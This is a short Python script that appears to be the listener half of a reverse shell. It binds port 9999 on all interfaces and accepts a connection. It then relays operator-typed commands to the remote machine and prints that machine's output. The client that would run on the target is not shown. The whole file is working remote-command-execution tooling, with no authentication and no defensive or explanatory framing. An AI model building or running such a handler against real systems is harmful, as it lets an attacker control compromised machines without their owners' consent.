import socket
import sys

#creat socket for connection

def socket_create():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s= socket.socket()
    except socket.error as msg:
        print("no connection could be established")

# bind socket to port and wait for connection

def socket_bind():
    try:
        global host
        global port
        global s
        print("binding established")
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("socket binding error" + str(msg))
        socket_bind()

#accepting connections:
#can only accept when port is listening

def socket_accept():
    conn, address = s.accept()
    print('connection established '+ "IP: " + address[0] + " port: "+ str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input("dries/: cmd for ssh")
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0 :
            conn.send(str.encode(cmd))
            client_response =str(conn.recv(1024), 'utf-8')
            print(client_response, end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()